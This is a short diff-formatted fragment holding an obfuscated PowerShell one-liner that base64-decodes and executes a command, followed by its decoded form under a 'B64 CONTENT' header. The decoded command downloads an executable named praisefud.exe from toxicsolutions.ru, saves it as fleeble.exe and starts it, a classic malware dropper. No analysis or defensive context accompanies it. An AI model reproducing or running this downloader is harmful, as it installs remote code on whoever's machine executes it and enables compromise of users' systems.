@@ -1,0 +1,7 @@
+iex([SysTEm.Text.eNCodiNG]::UtF8.GETSTRINg([sYSTeM.convERT]::froMbaSe64stRing('CihOZXctT2JqZWN0IHNZc1RlTS5uRVQud0ViQ0xJRW5UKS5kb1dubG9hZEZJbGUoJ2h0dHA6Ly90b3hpY3NvbHV0aW9ucy5ydS91cGxvYWQvcHJhaXNlZnVkLmV4ZScsJ2ZsZWVibGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZmxlZWJsZS5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sYsTeM.nET.wEbCLIEnT).doWnloadFIle('http://toxicsolutions.ru/upload/praisefud.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
